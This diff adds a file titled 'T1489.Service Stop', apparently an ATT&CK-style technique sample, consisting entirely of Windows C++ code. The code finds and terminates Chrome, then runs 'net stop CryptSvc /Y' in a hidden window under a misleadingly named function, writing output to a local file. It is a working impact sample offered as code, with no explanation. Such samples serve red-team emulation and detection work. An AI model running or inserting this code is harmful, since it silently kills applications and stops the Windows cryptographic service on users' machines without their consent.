@@ -1,0 +1,102 @@
+---
+title: "T1489.Service Stop"
+folder: "14. Impact"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+#include <tlhelp32.h>
+
+int CHROME() {
+
+    DWORD chromeProcessId = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (_wcsicmp(pe32.szExeFile, L"chrome.exe") == 0) {
+                chromeProcessId = pe32.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+    CloseHandle(hSnapshot);
+
+    if (chromeProcessId != 0) {
+        HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, chromeProcessId);
+        if (hProcess != NULL) {
+            if (TerminateProcess(hProcess, 0)) {
+                std::cout << "Chrome został pomyślnie zakończony." << std::endl;
+            }
+            else {
+                std::cerr << "Błąd podczas zakończenia procesu Chrome." << std::endl;
+            }
+            CloseHandle(hProcess);
+        }
+        else {
+            std::cerr << "Błąd podczas otwierania uchwytu procesu Chrome." << std::endl;
+        }
+    }
+    else {
+        std::cerr << "Nie można znaleźć procesu Chrome." << std::endl;
+    }
+
+    return 0;
+}
+void RunSystemInfoInBackground() {
+    std::ofstream outputFile("Wynik.txt");
+    const char* command = "net stop CryptSvc /Y";
+
+    SECURITY_ATTRIBUTES saAttr;
+    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    saAttr.bInheritHandle = TRUE;
+    saAttr.lpSecurityDescriptor = NULL;
+
+    HANDLE hReadPipe, hWritePipe;
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) { outputFile.close(); return; }
+
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdError = hWritePipe;
+    si.hStdOutput = hWritePipe;
+
+    PROCESS_INFORMATION pi;
+
+    if (!CreateProcessA(NULL, const_cast<LPSTR>(command), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { outputFile.close(); return; }
+
+    CloseHandle(hWritePipe);
+
+    const int BUFFER_SIZE = 4096;
+    char buffer[BUFFER_SIZE];
+    DWORD bytesRead;
+
+    while (ReadFile(hReadPipe, buffer, BUFFER_SIZE, &bytesRead, NULL) && bytesRead > 0) {
+        std::string data(buffer, bytesRead);
+        size_t pos = 0;
+
+        while ((pos = data.find("\n", pos)) != std::string::npos) {
+            data.erase(pos, 1);
+        }
+
+        outputFile.write(data.c_str(), data.size());
+    }
+
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    outputFile.close();
+}
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    CHROME();
+    RunSystemInfoInBackground();
+    return 0;
+}
